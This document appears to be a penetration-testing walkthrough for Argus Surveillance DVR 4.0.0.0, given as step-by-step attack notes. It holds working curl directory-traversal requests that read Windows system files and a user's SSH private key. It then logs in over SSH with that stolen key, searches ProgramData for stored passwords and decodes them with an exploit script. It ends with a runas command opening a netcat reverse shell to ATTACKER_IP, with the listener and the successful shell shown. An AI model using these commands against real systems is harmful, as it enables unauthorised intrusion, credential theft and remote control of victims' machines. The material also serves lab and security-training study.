# Argus Surveillance DVR

Argus Surveillance DVR 4.0.0.0 exposes a web interface that can be vulnerable to unauthenticated directory traversal. On Windows targets, this can expose SSH keys and Argus configuration files with recoverable credentials.

## Discovery

Look for Argus on the HTTP service, often on TCP/8080:

Useful indicators:

```text
22/tcp   open  ssh          Bitvise WinSSHD 8.48
8080/tcp open  http-proxy
|_http-title: Argus Surveillance DVR
|_http-generator: Actual Drawing 6.0 (http://www.pysoft.com) [PYSOFTWARE]
```

The web panel may expose users without authentication:

```text
http://TARGET:8080/Users.html
```

Observed users:

```text
Administrator
Viewer
```

## Directory Traversal

SearchSploit entry:

```bash
searchsploit argus
searchsploit -m windows_x86/webapps/45296.txt
```

The Argus `WEBACCOUNT.CGI` endpoint can read arbitrary files through the `RESULTPAGE` parameter:

```bash
curl "http://TARGET:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD="
```

Expected proof:

```text
; for 16-bit app support
[386Enh]
woafont=dosapp.fon
```

Read the Windows hosts file the same way:

```bash
curl "http://TARGET:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fhosts&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD="
```

## Steal SSH Key

Use the exposed users to target Windows profile SSH keys. The `Viewer` user's key was readable:

```bash
curl "http://TARGET:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fusers%2Fviewer%2F.ssh%2Fid_rsa&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD=" -o id_rsa.viewer
chmod 600 id_rsa.viewer
ssh viewer@TARGET -i id_rsa.viewer
```

## Argus Stored Credentials

From the low-privileged shell, search `ProgramData` for password values:

```powershell
Get-ChildItem -Recurse -Path "C:\ProgramData" -Include @("*.txt","*.ini","*.cfg","*.config","*.xml","*.ps1","*.yml","*.bat","*.vbs","*.py","*.yaml") -ErrorAction SilentlyContinue | Select-String "password"
```

Argus credentials were stored in:

```text
C:\ProgramData\PY_Software\Argus Surveillance DVR\DVRParams.ini
```

Relevant values:

```ini
LoginName0=Administrator
Password0=ECB453D16069F641E03BD9BD956BFE36BD8F3CD9D9A8
Password1=5E534D7B6069F641E03BD9BD956BC875EB603CD9D8E1BD8FAAFE
```

Use the Argus weak password encryption exploit to decode stored passwords:

```bash
searchsploit -m windows/local/50130.py
python3 50130.py
```

## Administrator Shell

Use the recovered password with `runas` from `cmd.exe`. See [Recovered Local Admin Credentials](../windows-priv-esc/windows-privilege-abuse.md#recovered-local-admin-credentials) for the general TTP.

```cmd
runas /user:Administrator "nc.exe -e cmd.exe ATTACKER_IP 9001"
```

Catch the shell:

```bash
nc -nlvp 9001
```

Successful shell:

```text
connect to [ATTACKER_IP] from (UNKNOWN) [TARGET]
Microsoft Windows [Version 10.0.19044.1645]
C:\WINDOWS\system32>
```

## References

- https://www.exploit-db.com/exploits/45296
- https://www.exploit-db.com/exploits/50130
